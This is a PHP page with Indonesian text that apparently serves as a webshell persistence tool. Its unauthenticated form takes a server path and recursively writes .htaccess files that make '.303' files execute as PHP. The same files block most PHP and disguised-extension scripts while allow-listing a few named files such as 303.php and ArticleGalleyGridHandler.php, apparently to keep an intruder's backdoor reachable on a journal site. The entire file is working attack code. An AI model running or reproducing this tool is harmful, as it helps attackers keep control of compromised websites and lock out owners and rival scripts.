<?php
// Set header untuk output HTML
header('Content-Type: text/html; charset=UTF-8');

// Fungsi untuk membuat file .htaccess
function createHtaccess($dir) {
    $htaccessContent = <<<EOD
AddType application/x-httpd-php .303
<FilesMatch ".(PhP|php|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|phar|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip)$">
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "^(|index.php|includes.php|303.php|ArticleGalleyGridHandler.php|files.php)$">
Order allow,deny
Allow from all
</FilesMatch>
EOD;

    $filePath = rtrim($dir, '/') . '/.htaccess';
    file_put_contents($filePath, $htaccessContent);
    return "<p>Berhasil Membuat .htaccess di " . htmlspecialchars($dir) . "</p>";
}

// Fungsi untuk membuat .htaccess secara rekursif
function createHtaccessRecursive($baseDir) {
    $output = '';
    // Buat .htaccess di direktori utama
    $output .= createHtaccess($baseDir);

    // Cari semua subdirektori
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        if ($item->isDir() && $item->getPathname() !== $baseDir) {
            $output .= createHtaccess($item->getPathname());
        }
    }
    return $output;
}

// Mulai output HTML
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buat File .htaccess</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .form-container {
            margin-bottom: 20px;
        }
        .form-container input[type="text"] {
            width: 70%;
            padding: 8px;
            margin-right: 10px;
        }
        .form-container input[type="submit"] {
            padding: 8px 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        .form-container input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: red;
        }
        .success {
            color: green;
        }
    </style>
</head>
<body>
    <h1>Buat File .htaccess</h1>
    <div class="form-container">
        <form method="post">
            <input type="text" name="directory" placeholder="Masukkan path direktori (contoh: /public_html/plugins/generic/coins)" required>
            <input type="submit" value="Buat .htaccess">
        </form>
    </div>

    <?php
    // Proses form jika ada input
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['directory'])) {
        $targetDir = $_POST['directory'];

        // Cek apakah direktori valid
        if (!is_dir($targetDir)) {
            echo '<p class="error">Error: Direktori "' . htmlspecialchars($targetDir) . '" tidak ditemukan</p>';
        } else {
            // Dapatkan path absolut
            $targetDir = realpath($targetDir);
            
            // Jalankan fungsi untuk membuat .htaccess
            echo createHtaccessRecursive($targetDir);
            echo '<p class="success">Selesai membuat file .htaccess di ' . htmlspecialchars($targetDir) . ' dan semua subdirektorinya</p>';
        }
    }
    ?>
</body>
</html>
